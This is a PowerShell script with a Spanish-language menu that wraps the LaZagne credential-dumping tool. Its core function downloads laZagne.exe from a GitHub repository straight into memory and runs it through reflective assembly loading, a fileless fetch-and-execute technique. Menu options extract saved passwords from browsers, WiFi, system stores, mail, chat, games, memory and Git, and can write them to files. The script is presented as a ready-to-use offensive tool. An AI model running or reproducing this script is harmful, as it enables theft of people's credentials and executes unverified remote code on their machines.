# lag_menu.ps1 - Versión con menú completo
function Show-Menu {
    Clear-Host
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host "           LaZagne COMMAND MENU           " -ForegroundColor Yellow
    Write-Host "==========================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "📋 MÓDULOS PRINCIPALES:" -ForegroundColor Green
    Write-Host "   1.  all                 - Todos los módulos" -ForegroundColor White
    Write-Host "   2.  browsers            - Chrome, Firefox, Edge, Opera" -ForegroundColor White
    Write-Host "   3.  wifi                - Contraseñas WiFi" -ForegroundColor White
    Write-Host "   4.  sysadmin            - Contraseñas del sistema" -ForegroundColor White
    Write-Host "   5.  mails               - Outlook, Thunderbird" -ForegroundColor White
    Write-Host "   6.  chats               - Skype, Discord, Pidgin" -ForegroundColor White
    Write-Host ""
    Write-Host "🔧 OPCIONES DE SALIDA:" -ForegroundColor Magenta
    Write-Host "   7.  browsers -oJ        - Navegadores en JSON" -ForegroundColor Gray
    Write-Host "   8.  all -oN -vv         - Todo + modo verbose" -ForegroundColor Gray
    Write-Host "   9.  wifi -output file.txt - Guardar en archivo" -ForegroundColor Gray
    Write-Host ""
    Write-Host "💀 COMANDOS PERSONALIZADOS:" -ForegroundColor Red
    Write-Host "   10. Ingresar comando MANUAL" -ForegroundColor Yellow
    Write-Host "   11. Combinar módulos (ej: browsers wifi)" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "❓ AYUDA:" -ForegroundColor Blue
    Write-Host "   12. Ver todos los comandos disponibles" -ForegroundColor Cyan
    Write-Host "   0.  Salir" -ForegroundColor Red
    Write-Host ""
    Write-Host "==========================================" -ForegroundColor Cyan
}

function Execute-LaZagne {
    param([string[]]$Arguments)
    
    Write-Host "`n[+] Ejecutando: laZagne $Arguments" -ForegroundColor Green
    Write-Host "=" * 50 -ForegroundColor DarkGray
    
    # URL de tu ejecutable
    $exeUrl = "https://github.com/kobasky17/lagzane.exe-for-windows/raw/refs/heads/master/laZagne.exe"
    
    try {
        # Descargar a memoria
        $bytes = (New-Object Net.WebClient).DownloadData($exeUrl)
        
        # Cargar y ejecutar desde memoria
        $assembly = [System.Reflection.Assembly]::Load($bytes)
        $result = $assembly.EntryPoint.Invoke($null, @(, $Arguments))
        
        Write-Host "`n[✓] Ejecución completada" -ForegroundColor Green
        return $result
    } catch {
        Write-Host "[✗] Error: $_" -ForegroundColor Red
        return $null
    }
}

function Show-AllCommands {
    Clear-Host
    Write-Host "=== TODOS LOS COMANDOS DE LaZagne ===" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "📌 MÓDULOS:" -ForegroundColor Yellow
    Write-Host "   all                    - Todos los módulos"
    Write-Host "   browsers               - Navegadores web"
    Write-Host "   wifi                   - Redes WiFi"
    Write-Host "   sysadmin               - Credenciales del sistema"
    Write-Host "   mails                  - Clientes de correo"
    Write-Host "   chats                  - Mensajería instantánea"
    Write-Host "   games                  - Juegos (Steam, Minecraft)"
    Write-Host "   memory                 - Memoria RAM"
    Write-Host "   git                    - Credenciales Git"
    Write-Host ""
    Write-Host "⚙️  OPCIONES:" -ForegroundColor Green
    Write-Host "   -oN                    - Output normal (default)"
    Write-Host "   -oJ                    - Output JSON"
    Write-Host "   -oX                    - Output XML"
    Write-Host "   -oA                    - Todos los formatos"
    Write-Host "   -output <file>         - Guardar en archivo"
    Write-Host "   -vv                    - Modo verbose"
    Write-Host "   -quiet                 - Modo silencioso"
    Write-Host ""
    Write-Host "🔧 EJEMPLOS:" -ForegroundColor Magenta
    Write-Host "   browsers -oJ"
    Write-Host "   wifi browsers -output C:\pass.txt"
    Write-Host "   all -vv -oA"
    Write-Host "   sysadmin -quiet"
    Write-Host ""
    pause
}

# Menú principal
do {
    Show-Menu
    $choice = Read-Host "`nSelecciona una opción [0-12]"
    
    switch ($choice) {
        "0" { 
            Write-Host "Saliendo..." -ForegroundColor Yellow
            exit 
        }
        
        "1" { 
            Execute-LaZagne -Arguments @("all", "-oN")
        }
        
        "2" { 
            Execute-LaZagne -Arguments @("browsers", "-oN")
        }
        
        "3" { 
            Execute-LaZagne -Arguments @("wifi", "-oN")
        }
        
        "4" { 
            Execute-LaZagne -Arguments @("sysadmin", "-oN")
        }
        
        "5" { 
            Execute-LaZagne -Arguments @("mails", "-oN")
        }
        
        "6" { 
            Execute-LaZagne -Arguments @("chats", "-oN")
        }
        
        "7" { 
            Execute-LaZagne -Arguments @("browsers", "-oJ")
        }
        
        "8" { 
            Execute-LaZagne -Arguments @("all", "-oN", "-vv")
        }
        
        "9" { 
            $file = Read-Host "Nombre del archivo (ej: pass.txt)"
            Execute-LaZagne -Arguments @("wifi", "-output", $file)
        }
        
        "10" { 
            Write-Host "`n💀 MODO COMANDO MANUAL" -ForegroundColor Red
            Write-Host "Ejemplos:"
            Write-Host "  browsers wifi -oJ"
            Write-Host "  all -output C:\Users\Public\pass.txt"
            Write-Host "  sysadmin -vv"
            Write-Host ""
            $manualCmd = Read-Host "Ingresa el comando completo"
            
            if ($manualCmd) {
                $argsArray = $manualCmd.Split(" ")
                Execute-LaZagne -Arguments $argsArray
            }
        }
        
        "11" { 
            Write-Host "`n🔧 COMBINAR MÓDULOS" -ForegroundColor Yellow
            Write-Host "Módulos disponibles: browsers, wifi, sysadmin, mails, chats, games, memory"
            Write-Host ""
            $modules = Read-Host "Ingresa módulos separados por espacio (ej: browsers wifi)"
            $format = Read-Host "Formato (n=normal, j=json, x=xml) [n]"
            
            $formatArg = switch ($format.ToLower()) {
                "j" { "-oJ" }
                "x" { "-oX" }
                default { "-oN" }
            }
            
            $argsArray = $modules.Split(" ") + @($formatArg)
            Execute-LaZagne -Arguments $argsArray
        }
        
        "12" { 
            Show-AllCommands
        }
        
        default {
            Write-Host "Opción inválida" -ForegroundColor Red
        }
    }
    
    if ($choice -ne "0") {
        Write-Host "`n" + ("=" * 50) -ForegroundColor DarkGray
        pause
    }
    
} while ($choice -ne "0")